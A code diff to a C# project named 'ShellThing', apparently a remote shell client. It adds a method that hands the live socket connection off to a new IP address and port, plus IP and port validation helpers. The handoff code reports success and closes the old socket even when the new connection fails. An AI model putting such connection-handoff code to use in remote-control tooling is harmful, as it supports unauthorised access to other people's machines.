@@ -84,5 +84,59 @@ namespace ShellThing
             socket.Close();
         }
 
+        public void HandoffConenection(string ipAddress, string portNumber)
+        {
+            Socket tempSocket = socket;
+
+            try
+            {
+                StartClient(ipAddress, portNumber);
+            }
+            catch (Exception e)
+            {
+                SendData($"Handoff - Exception Starting new socket client: {e.Message}");
+                socket = tempSocket;
+            }
+
+            // Sign off and close down current connection
+            SendData("[+] New connection established successfully. Closing connection...");
+            tempSocket.Shutdown(SocketShutdown.Both);
+        }
+
+        public static bool ValidateIpAddress(string ipAddress)
+        {
+            IPAddress address;
+
+            if (IPAddress.TryParse(ipAddress, out address))
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+
+        public static bool ValidatePortNumber(string portNumber)
+        {
+            try
+            {
+                int port = Int32.Parse(portNumber);
+
+                if (port > 0 && port <= 65535)
+                {
+                    return true;
+                }
+                else
+                {
+                    return false;
+                }
+            }
+            catch (Exception e)
+            {
+                return false;
+            }
+        }
+
     }
 }
